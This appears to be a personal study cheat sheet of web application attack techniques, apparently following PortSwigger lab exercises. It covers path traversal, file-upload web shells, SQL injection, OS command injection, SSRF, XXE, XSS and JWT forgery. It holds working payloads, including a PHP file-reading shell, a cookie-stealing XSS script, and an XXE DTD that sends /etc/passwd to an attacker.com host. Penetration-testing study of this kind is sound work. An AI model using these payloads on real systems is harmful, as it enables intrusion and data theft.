Server-Side Attacks
Directory Traversal Testing (../ - known as sequence)
	- when using an API to fetch images/files
		* eg - /loadimage?filename=219.png == var/www/images
		* change to filename=../../../etc/passwd (in url or POST body)
	- if sequences are stripped
		* use nested sequence(....//, ....\/) -> (inner stripping - .."../"/ or .."..\"/)
		* use encodings, double encodings (url or non-standard (..%c0%af, ..%ef%bc%8f) (payload list (Fuzzing - path traversal))
		* provide directly without sequence (/etc/passwd)
	- if it requires the filename to start with var/www/images
		* use var/www/images/../../../etc/passwd
	- if it checks the file extension
		* use null byte(%00) eg - var/www/../../../etc/passwd%00.png
	- in case of windows OS ../ and ..\ are valid, search for /windows/win.ini

File Upload Testing (payload - <?php echo file_get_contents('/path/to/target/file'); ?>)
	- Remote code execution via web shell upload
		* direct upload of payload file (have no restriction specified in accept-type header) - all types(*/*)
 	- Web shell upload via Content-Type restriction bypass
		* change content-type header to allowed file types but upload any php/similar file (server does not validate content-type header with the file extension or contents)
  	- Web shell upload via path traversal (restrictions on user-directory for permitted file types)
		* change the directory where file upload happens (bypass directory restrictions) -> ../../exploit.php (try encoding for ../../)
	- Web shell upload via extension blacklist bypass
		* by overriding server configuration (etc/apache2/apache2.conf)
		* eg - LoadModule php_module /usr/lib/apache2/modules/libphp.so, AddType application/x-httpd-php .php
		* create special configuration files within individual directories - upload a .htaccess file (filename = .htaccess)
		* contents -> AddType application/x-httpd-php .133t
		* change content-type to text/plain
	- Web shell upload via obfuscated file extension
		* try following patterns -> filename.php.jpg, filename.jpg.php, filename.php., filename%2Ephp (url encode), filename.pphphp
		* Provide multiple extensions
		* Add trailing characters (".") - > filename.php.
		* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes
		* Add semicolons or URL-encoded null byte characters before the file extension.
		* Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. (xC0 x2E, xC4 xAE or xC0 xAE translated to x2E if parsed as UTF-8 string)
		* use nested extensions to bypass stripping
	- Flawed validation of the file's contents
		* certain file types may always contain a specific sequence of bytes in their header or footer
		* eg -> JPEG files always begin with the bytes FF D8 FF
		* ExifTool, create a polyglot JPEG file containing malicious code within its metadata
		* cmd -> exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o <output image>
		* Can find the output between start and end strings
	- Exploiting file upload race conditions
		* Uploads the file to a temp directory and perform validation - virus checks etc
		* the uploaded file is moved to an accessible folder, where checked for viruses. Malicious files are removed once the virus check completes
		* Turbo Intruder extender required
		* code to execute race condition
		* def queueRequests(target, wordlists):
    			engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    			request1 = '''<YOUR-POST-REQUEST>'''

    			request2 = '''<YOUR-GET-REQUEST>'''

    			# the 'gate' argument blocks the final byte of each request until openGate is invoked
    			engine.queue(request1, gate='race1')
    			for x in range(5):
        			engine.queue(request2, gate='race1')

    			# wait until every 'race1' tagged request is ready
    			# then send the final byte of each request
    			# (this method is non-blocking, just like queue)
    			engine.openGate('race1')

    			engine.complete(timeout=60)


		def handleResponse(req, interesting):
    			table.add(req)
	- Uploading malicious client-side scripts
		* if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads
	- Exploiting vulnerabilities in the parsing of uploaded files
		* server parses XML-based files, such as Microsoft Office .doc or .xls files, this may be a potential vector for XXE injection attacks. 
	- Uploading files using PUT
		* PUT /images/exploit.php HTTP/1.1
		  Host: vulnerable-website.com
		  Content-Type: application/x-httpd-php
		  Content-Length: 49

 		  <?php echo file_get_contents('/path/to/file'); ?> 

SQL injection
	- Detect SQL injection vulnerabilities
		* Submit ', SQL-specific syntax(ASCII(97)), OR 1=1, trigger time delays, OAST payloads to trigger out-of-band interaction
	Second-order SQL injection
		* First-order SQL injection arises where the application takes user input from an HTTP request
		* second-order (stored SQLi), takes user input from an HTTP request and stores it for future use.
		* The DB when fetching from stored values might not perform any additional sanitization.
	- Retrieving hidden data
		* use comments syntax to change the logic ('--)
		* use ' OR 1=1--, '+OR+1=1--
	- Subverting application logic
		* in case of username and password -> changing logic to only check the username and ignore the password
	- Retrieving data from other database tables
		* use UNION keyword
  UNION Attacks - retrieve data from other tables -> appends one or more queries to original query
	- Requirements
		* individual queries must have the same number of columns
		* data types in each column must be compatible 
	- Determine the number of columns being displayed using ORDER BY keyword
		* '+ORDER+BY+1--
		* '+UNION+SELECT+NULL,NULL-- (ADD MORE NULL if required) -> reason for using NULL is because it should be compatible with the data types
	- Determine the data type of column
		* '+UNION+SELECT+'A',NULL,NULL-- (keep changing the position of string and Increase or decrease NULL values)
	- Retrieving multiple values within a single column
		* Retrieve multiple values within this single column by concatenating the values together.
		* '+UNION+SELECT+username+||+'~'+||+password+FROM+users--
		* eg. oracle database uses || for string concatenation -> change accordingly
  Examining Database Details
	- Depending on DB version query changes
	- For Oracle - requires "FROM" keyword as a must
	- Use Burp SQL injection cheatsheet
  Blind SQL Injection
	- Detection
		* Trigger a detectable difference in the application's response depending on the truth/false of a single condition.
		* Trigger a time delay in the processing of the query
		* Trigger an out-of-band network interaction, using OAST techniques.
	- Exploiting blind SQL injection by triggering conditional responses(works only if there is some kind of difference in the response)
		* eg- trackingID cookie
		* xyz' AND '1'='1 , xyz' AND '1'='2
		* xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
		* SUBSTRING method used is differemnt depending on DB version
		* make use of length() and subtring()
		* in intruder ther is an option grep-match - provide the difference in response message
	- Inducing conditional responses by triggering SQL errors (works only if error handling mechanism is not defined)
		* xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
		* xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 	
		* here if the condition is true it will throw an error for division by zero
		* use substring() and length() to know about the details that is to be fetched
		* in intruder look for 500 status code
	- Exploiting blind SQL injection by triggering time delays (if error handling mechanism is defined)
		* triggering time delays conditionally, depending on an injected condition
		* '; IF (1=2) WAITFOR DELAY '0:0:10'--
		* '; IF (1=1) WAITFOR DELAY '0:0:10'-- (triggers a delay of 10 seconds)
		* time delay function varies depending on DB version
		* in resource pool change max concurrent requests to 1 and in results -> column -> response recieved/completed -> look for the number matching the time delay
	- Exploiting blind SQL injection using out-of-band (OAST) techniques (when sql query are not executed synchronously)
		* make use of burp collaborator
		* cmd varies according to version of DB
		* if sql query is executed asynchronously -> use this method

Authentication Vulnerabilities
	- How do authentication vulnerabilities arise?
		* Authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
		* Logic flaws or poor coding in the implementation -> commonly known as broken auth
	- Vulnerabilities in password-based login
		* check for email addresses of admins or users in response
	    - Username enumeration
		* observe changes in the website's behavior in order to identify whether a given username is valid
		* pay particular attention to : status codes, error messages, and response time
		* to bypass IP based brute force protection make use of http request headers (X-Forwarded-For)
	    - Flawed brute-force protection
		* if app blocks an account based on IP address (with regards to multiple login attempts)
		* bypass by logging in using correct credentials(create a legit account) alternatively while brute forcing for other accounts
		* account lockout (with regards to multiple login attempts)
		* bypass - cluster bomb method - for valid username it shows a differnt response - make use of 2 payloads (username and null payloads(5 times))
		*credential stuffing - username/password pairs obtained from some data breach
	    - User rate limiting
		* making too many login requests within a short period of time causes your IP address to be blocked
		* bypass - in password change the value from single value to an array of passwords
	    - HTTP basic authentication
		* client receives authentication token from server, constructed by concatenating the username and password, and encoding it in Base64
		* lead to session based exploits and csrf
	- Vulnerabilities in multi-factor authentication
	    - 2FA simple bypass
		* without providing the otp - since already in logged-in state (try accessing some other link in the application)
	    - 2FA broken logic
		* making use of cookie assigned to actual user for logging into the victim account
		* might be using a second login to send otp linked to that victim account - after initiating the otp  - bruteforce the otp
	    - 2FA bypass using a brute-force attack
		* if application uses a lockout mechanism for multiple otp attempts based on session
		* create a macro in project options -> sessions providing the required requests needed to initiate new session for each attempt made.
		* for macro to work add session rules and appropriate options
	- Vulnerabilities in other authentication mechanisms (change password or reset email)
	   - Brute-forcing a stay-logged-in cookie( rememeber me or keep me logged in)
		* analyze the cookie - hows its constructed - might contain in encoded form which contains username and hash of passwword
	   - Offline password cracking (crackstation - hash cracking)
		* make use of stored XSS (<script>document.location='server-name/'+document.cookie</script>
		* when victim open the vulnerable page teh cookie is sent to our server
	   - Password reset broken logic
		* reset url mentions the ID token of the user whose password is to be changed
			- check for url token if it specifies the username or check the request body for info related to user
	   - Password reset poisoning via middleware
		* make use of host header attack to send the password reset token to a server that we own - access.log provides the unique token assigned to the victim
	   - Password brute-force via password change
		* after logging in as actual user intercept the password reset page that checks whether the old password macthes the username paramneter
		* brute force the old password parameter to reset the password of victim user
		* check for different scenarios to observe any difference in server response (eg provide correct old password and differ new password in 2 input fields and vice-versa)

OS Command Injection
	- Command separators inlcude (&, |, &&, ||) (works for both windows and UNIX)
	- for unix - ;, 0x0a or \n, `injected command`, $(injected command)
	- might need to close the quotyes(", ') for command to execute
	- eg - & echo hello &, & ping -c 10 127.0.0.1 (blind)
	- Useful commands - whoami, uanme -a, ifconfig, netstat -an, ps -ef (linux), whoami, ver ipconfig/all, netstat -an, tasklist (windows)
	   - OS command injection, simple case
		* check whether any input pqarameters execute OS commands 
		* eg - & echo helloworld &
	   - Blind OS command injection with time delays
		* & ping -c 10 127.0.0.1 & (try using different separators)
		8* triggers a time delay to send 10 ICMP packets
	   - Blind OS command injection with output redirection
		* can output the contents of a command to a text file that can be viewed in the browser
		* need to try in different folders that has writable privelege
		* eg - & whoami > var/www/html/whoami.txt &
	   - Blind OS command injection with out-of-band interaction
		* make use of burp collaborator to initiate a nslookup
		* eg - & nslookup domain.com &, & nslookup `whoami`.domain.com &

Business logic vulnerabilities (to be continued)
	- Excessive trust in client-side controls
		* not validating the user input at server-side
	- High Level Logic
		* in product purchasing add to cart product quantity should not acceptr a negative value
		8 which affects the total of products in the cart
	- Low level 

Information disclosure vulnerabilities
	- robots.txt - revealing hidden directories
	- information about frameworks or sensitive data
	- enabling debugging features -/cgi-bin/phpinfo.php

	- How to test for information disclosure vulnerabilities
		* Fuzzing - try submitting different data types or fuzz crafted strings and observer the response from the server
		* Using Burp Scanner - crawls through the target and auto notifies any info disclosed 
		* Engineering informative responses - observe the error messages - stack trace
	- Files for web crawlers
		* search for robots.txt or sitemap.xml
	- Directory listings - accessing temporary file and crash dumps
	- Developer comments
	- Hardcoded password in backup files/source code
	- trace may be enabled -  discloses intenral authentication headers
	- check for version comntrol hsitory info in /.git file
		* git cat-file -p "--value--"
		* git log -> git diff "--value1--" "--value2--"

Access control vulnerabilities and privilege escalation
	- Access control security models
		* Programmatic access control - matrix of user privileges is stored in a database,nclude roles or groups or individual users, collections or workflows of processes
		* Discretionary access control (DAC) - Owners of resources assign permission to users - gets complex when no. of users increases
		* Mandatory access control (MAC) - entrally controlled system of access control 
		* Role-based access control (RBAC) - providing access controls based on role
	- Vertical access controls - admin privileges
	- Horizontal access controls - one user not allowed to view details of other user
	- Context-dependent access controls -based upon the state of the application or the user's interaction 
		* For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment.
	- Vertical and Horizontal privEsc
   - Testing
	- Unprotected functionality
		* search for any pages with admin functionalities (robots.txt or look in the server response mentioning the URL based on role)
	- Parameter-based access control methods
		* User role controlled by request parameter - cookie value decides whether to provide admin access
		* User role can be modified in user profile - check for any parameter that checks the privilege in request or response
			- If found in response try sending that paarameter assigning a different value to obtain high level privilege along with the request body
	- Broken access control resulting from platform misconfiguration
	  URL-based access control can be circumvented
		* Some application support non-standard HTTP headers to override the URL in the original request, such as X-Original-URL and X-Rewrite-URL.
			- to bypass certain HTTP methods being performed on a particular URL
	  Method-based access control can be circumvented
		* If restrictions are in place for POST method we can try executing the operation using GET method (vice-versa)
	- Horizontal privilege escalation
		* check for any parameter that can be tampered.
		* check for any id's in any messages, posts, comments etc that mentions any uniques id tagged to that user.
		* while changing the parameter tagged to user observe the response in redirection to login page
	- Horizontal to vertical privilege escalation
		* similar to horizontal checks, only difference is gain access to privileged user.
		* check whether after escalation if the current user password field is auto-populated, if so password can be obtained from the response
	- Insecure direct object references
		* check for any incremental parameter that can be tampered
	- Access control vulnerabilities in multi-step processes
		* in multi-step[ process of form fillin or related kinds, there is a chance some steps might not have access controls set.
	- Referer-based access control
		* application robustly enforces access control over the main administrative page at /admin, but for sub-pages such as /admin/deleteUser only inspects the Referer header. 
		  If the Referer header contains the main /admin URL, then the request is allowed.
	- Location-based access control
		* circumvented by the use of web proxies, VPNs, or manipulation of client-side geolocation mechanisms

Server-side request forgery (SSRF)
  - result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems
  - allow an attacker to perform arbitrary command execution.
	- SSRF attacks against the server itself
		* make an HTTP request back to the server that is hosting the application, via its loopback network interface.
		* 127.0.0.1, localhost or alternatives (2130706433, 017700000001, or 127.1)
	- SSRF attacks against other back-end systems
		* sometimes back-end systems/admin interfaces are accessible using private ip address (brute force ip's)
	- SSRF with blacklist-based input filters
	 	* Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose
		* URL encoding for bypass of blacklisted strings
		* Using alternatives for localhost
	- SSRF with whitelist-based input filters
		* You can embed credentials in a URL before the hostname, using the @ character. For example:https://expected-host@evil-host
		* You can use the # character to indicate a URL fragment. For example:https://evil-host#expected-host
		* You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:https://expected-host.evil-host
		* You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
    		* You can use combinations of these techniques together.
		* example : http%3A%2F%2F127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos (app check for the domain name if it is stock.weliketoshop.net
			bypass this filter using @ and double encoded # (%2523)
	- Bypassing SSRF filters via open redirection
		* check for any parameter that allows open redirection try ssrf if possible
		* use the same path above obtained in any other parameter that makes call to internal systems
	- Blind SSRF with Shellshock exploitation (to be tried)
		* payload - () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
		* referer header initiated a http request if url provided along with the contents of user-agent string
		* provide the shellshock payload in the user-agent header
		* bruteforce an internal system by providing IP in referer header which will send the user-agent content and gets executed on the internal system

XML external entity (XXE) injection
	- % xxe = parameter entity and invoked only with the DTD as %xxe;
	- xxe = external enity and invoked anywhere as &xxe;
	- How do XXE vulnerabilities arise?
		* Applications use the XML format to transmit data between the browser and the server
		* XML specification contains dangerous features, and standard parsers support these features
	- Exploiting XXE using external entities to retrieve files
		* provide the common payload
		* <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	- Exploiting XXE to perform SSRF attacks
		* The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. 
		* <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data" >]>
		* same url for every scenario (default IP set for EC2 metadata
	- Blind XXE vulnerabilities
		* to exfiltrate data use 2 methods
		  - throught oast technique using colloborator or similar tools / by triggerring error messages that can contain sensitive data
	    - Blind XXE with out-of-band interaction
		* <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http:burpcollaborator" >]> (invoke &xxe; in any of the existing data elements or within the xml document)
	    - Blind XXE with out-of-band interaction via XML parameter entities
		* <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burpcollaborator" > %xxe; ]> (invoke %xxe; within the existing DTD if the above method does not work)
	    - Exploiting blind XXE to exfiltrate data out-of-band (only if application allows to fetch contents remotely)
		* create a malicious.dtd external dtd file and host it in attacker controlled server to be fetched by victim server
		* malicious.dtd (contents)
			- <!ENTITY % file SYSTEM "file:///etc/passwd">
			- <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://www.attacker.com/?x=%file; '>">
			- %eval;
			- %exfiltrate;
		* payload to be provided in victim application
			- <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>
	    - Exploiting blind XXE to retrieve data via error messages (only if application allows to fetch contents remotely)
		* effective only if the application returns the resulting error message within its response
		* host external dtd malicious.dtd
			- <!ENTITY % file SYSTEM "file:///etc/passwd">
			- <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
			- %eval;
			- %error;
		* payload to be provided in victim application
			- <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>
	    - external dtd is only possible because xml parameter entity can be used within the definition of another parameter entity 
		which is not possible in internal dtd
	    - Exploiting blind XXE by repurposing a local DTD (if remote fecthing of dtd file is not allowed)
		* exploitable if a document's DTD uses hybrid model (ie internal and external dtd declarations)
		* thhe restriction on using an XML parameter entity within the definition of another parameter entity is relaxed
		* external dtd that is local to the application server since out-of-band connections are blocked
		- Locating an existing DTD file to repurpose
			* <!DOCTYPE foo [
			  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
			  %local_dtd;
			  ]>
		* <!DOCTYPE foo [
		  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
		  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
		  <!ENTITY % ISOamso '
		  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
		  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
		  &#x25;eval;
		  &#x25;error;
		  '>
		  %local_dtd;
		  ]>
		* here ISOamso is an external enity that is redefined within the internal dtd to trigger an error message that displays the data
	    - XInclude attacks
			* when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service
			* XInclude is a part of the XML specification that allows an XML document to be built from sub-documents.
			* place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document
			* <foo xmlns:xi="http://www.w3.org/2001/XInclude">
			  <xi:include parse="text" href="file:///etc/passwd"/></foo>
			* above is added to a normal application that takes parameters in url-encoded format (eg: productid=1&storeid=1)
			* input the payload to productid="payload" -- if the backend server parses this as an xml document the payload gets executed (blind)
	    - XXE attacks via file upload
			* XML-based formats are office document formats like DOCX and image formats like SVG
			* if the above extensions are possible try uploading an svg image with malicious payload that gets displayed within the application (profile pic etc.)
			* <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
			* store the above payload as svg file extension and upload - output will be as the image
	    - XXE attacks via modified content type
			* POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded
			* Some web sites expect to receive requests in this format but will tolerate other content types, including XML
			* change the content-type header from url-encoded to text/xml and provide the parameters in xml format
			* if application accepts the xml format try for xml vuln mentioned above

---------------------------Client-Side Attacks------------------------------

Cross-site scripting
	* allows an attacker to compromise the interactions that users have with a vulnerable application
	* Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data.
	* cross-origin iframes are prevented from calling alert() in google chrome, alternative for it is the print()
	* Reflected XSS, where the malicious script comes from the current HTTP request
	* Stored XSS, where the malicious script comes from the website's database. 
	* DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
	- Impact of reflected XSS attacks
		* Perform any action within the application that the user can perform.
    		* View any information that the user is able to view.
    		* Modify any information that the user is able to modify.
    		* Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

	- Reflected XSS
	    * Reflected XSS into HTML context with nothing encoded
		- basic example of xss 
		- payload <script>alert(1);</script>
		- provide the payloads in any entry point such as parameters, request body, url-parameters, HTTP Headers etc
	- Stored cross-site scripting
	    * Stored XSS into HTML context with nothing encoded
		  - basic example same payload as above
	- DOM-based cross-site scripting
	    * need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript
	    * most common source for DOM XSS is the URL, which is typically accessed with the window.location object.
	    * DOM - is a web browser's hierarchical representation of the elements on the page.
	    * Source is a JavaScript property that accepts data that is potentially attacker-controlled. eg location.search property because it reads input from the query string
	    * Sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. Eg eval() function
	  Common sources
		document.URL
		document.documentURI
		document.URLUnencoded
		document.baseURI
		location
		document.cookie
		document.referrer
		window.name
		history.pushState
		history.replaceState
		localStorage
		sessionStorage
		IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
		Database
	Comman Sinks
		document.write()
		document.writeln()
		document.domain
		element.innerHTML
		element.outerHTML
		element.insertAdjacentHTML
		element.onevent
	  jQuery Sinks
		add()
		after()
		append()
		animate()
		insertAfter()
		insertBefore()
		before()
		html()
		prepend()
		replaceAll()
		replaceWith()
		wrap()
		wrapInner()
		wrapAll()
		has()
		constructor()
		init()
		index()
		jQuery.parseHTML()
		$.parseHTML()
	DOM XSS combined with reflected and stored data
		- Reflected DOM XSS
			* makes use of json code to reflect the payload
			* payload = \"-alert(1);}// (\ used to escape the double-quotes being provided auto)
		- Stored DOM XSS
			* go through the javascript code to determine how the inputs from user are being handled, whether the code checks any characters which is sanitized and displayed safely
			* look for any methods that can bypass these checks
			* payload <><img src=1 onerror=alert(1)> (code encodes the first occurence of angle brackets)
		- Controlling the web message source
		  * DOM XSS using web messages
			- <script>window.addEventListener('message', function(e) { eval(e.data); });</script> **vulberable code**
			- <iframe src="https://vulnerable-website-url/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"> **payload**
		  * DOM XSS using web messages and a JavaScript URL
			- <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                     </script>
			- <iframe src="https://vulnerable-website-url/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"> **payload**
	Testing HTML sinks - provide malicious string in a vulnerable source and search for it in the dev tool option
	Testing JavaScript execution sinks input string doesn't appear in DOM - make use of javascript debygger.
	Testing for DOM XSS using DOM Invader
	DOM XSS in document.write sink using source location.search
		Payload - "><svg onload=alert(1)>
	DOM XSS in document.write sink using source location.search inside a select element
		Introduce a new URL query parameter 
		Payload - "></select><img+src=1+onerror=alert(1)>
	DOM XSS in innerHTML sink using source location.search
		The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe.
	DOM XSS in jQuery

















--------------------------Advanced Attacks-----------------------------

JWT Attacks

	-JWTs are most commonly used in authentication, session management, and access control mechanisms, these vulnerabilities can potentially compromise the entire website and its users.
	-Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers.
	-A JWT consists of 3 parts: a header, a payload, and a signature.
	-The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual "claims" about the user.
	-security of any JWT-based mechanism is heavily reliant on the cryptographic signature.

  * JWT vs JWS vs JWE
	- JSON Web Signature (JWS)(By defaukt) and JSON Web Encryption (JWE)
	- JWE encrypts the contents

  * JWT attacks are used to impersonate as another user or escalate privileges who has already been authenticated.

  * How do vulnerabilities to JWT attacks arise?
	- signature of the JWT is not verified properly. 

  * Working with JWTs in Burp Suite
	- use JWT editor extender available in bapp store

  * Accepting arbitrary signatures
	- Node.js library jsonwebtoken has verify() and decode()
	- developers confuse these two methods and only pass incoming tokens to the decode() method.

  * Accepting tokens with no signature
	- the 'alg' parameter mentions the alogorithm that was used to sign the tokemn
	- if we change it to any other algorithm and sign it theh server consider it legitimate and successfully can be bypassed.
	- we can also mention value for 'alg' parameter as none,None,nOne,noNe, etc.
	- make sure when alg is set to nne or similar strings, remove the 3rd part ie signature from jwt andd end with a "dot"

  * Brute-forcing secret keys
	- signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key.
	-  developers sometimes make mistakes like forgetting to change default or placeholder secrets.
	- https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
	- Brute-forcing secret keys using hashcat
	- You just need a valid, signed JWT from the target server and a wordlist of well-known secrets.
	- Command = hashcat -a 0 -m 16500 <jwt> <wordlist>
	- Hashcat signs the header and payload from the JWT using each secret in the wordlist, then compares the resulting signature with the original one from the server.
	- once the secret is obtained go to jwt editor keys -> select the key to generate -> no need to mention the key size auto adjusted -> generate -> modify 'k' value with base64 encoded secret obtained using hashcat -> apply
	- sign the token in repeater tab after modifying the payload -> when signing maintain 'don't modify header' depending on scenario

  * JWT header parameter injections
	- According to the JWS specification, only the alg header parameter is mandatory
    * Other parameters
	- jwk (JSON Web Key) - Provides an embedded JSON object representing the key.
	- jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
	- kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.
    * these user-controllable parameters each tell the recipient server which key to use when verifying the signature.

  * Injecting self-signed JWTs via the jwk parameter
	- JSON Web Signature (JWS) specification describes an optional jwk header parameter, which servers can use to embed their public key directly within the token itself in JWK format.
	- example
		{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    		}
	}
	-servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that's embedded in the jwk parameter.
	- exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the jwk header.
	- Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.

  * Injecting self-signed JWTs via the jku parameter
	- servers let you use the jku (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.
	- example 
		{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        	}
    	   ]
	} 
	- JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as /.well-known/jwks.json.
	- generate a new key -> copy public key as jwk and serve remotely by hosting a server > in jwt modify the kid parameter to match the new key generated and inject jku parmeter to fetch the remotely stored public key using URL

  * Injecting self-signed JWTs via the kid parameter
	- might use the kid parameter to point to a particular entry in a database, or even the name of a file.
	- If this parameter is also vulnerable to directory traversal, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.
	- example
		{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
	}
	- You could theoretically do this with any file, but one of the simplest methods is to use /dev/null, which is present on most Linux systems. As this is an empty file, fetching it returns null. Therefore, signing the token with a Base64-encoded null byte will result in a valid signature.
	- If the server stores its verification keys in a database, the kid header parameter is also a potential vector for SQL injection attacks.
	- generate a symmetric key -> change the value of 'k' to base64 encoded null byte (AA==) -> modify the kid param to contain the path (/dev/null) -> change payload params -> sign using generated symmetric key

